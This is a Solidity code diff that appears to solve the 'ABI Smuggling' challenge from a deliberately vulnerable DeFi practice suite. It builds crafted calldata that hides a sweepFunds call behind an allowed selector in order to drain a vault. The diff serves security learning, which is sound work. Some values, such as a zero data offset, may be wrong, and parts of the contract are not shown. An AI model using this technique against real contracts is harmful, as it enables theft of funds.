@@ -73,7 +73,9 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        AttackABISmuggling attacker = new AttackABISmuggling(address(vault), address(token), recovery);
+        bytes memory payload = attacker.attack();
+        address(vault).call(payload);
     }
 
     /**
@@ -99,7 +101,9 @@ contract AttackABISmuggling {
         player = msg.sender;
     }
 
-    function attack() public {
+    function attack() public returns (bytes memory) {
+        require(msg.sender == player, "Only player");
+
         bytes4 executeSelector = vault.execute.selector;
         bytes memory target = abi.encodePacked(bytes12(0), address(vault));
         bytes memory dataOffset = abi.encodePacked(uint256(0x00));
@@ -115,6 +119,20 @@ contract AttackABISmuggling {
             token
         );
 
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        // emit LogActionDataLength(actionDataLengthValue);
+        bytes memory actionDataLength  = abi.encodePacked(uint256(actionDataLengthValue));
 
+        bytes memory payloadData = abi.encodePacked(
+            executeSelector,
+            target,
+            dataOffset,
+            emtyData,
+            withdrawSelectorPadded,
+            actionDataLength,
+            sweepFundsCalldata
+        );
+
+        return payloadData;
     }
 }
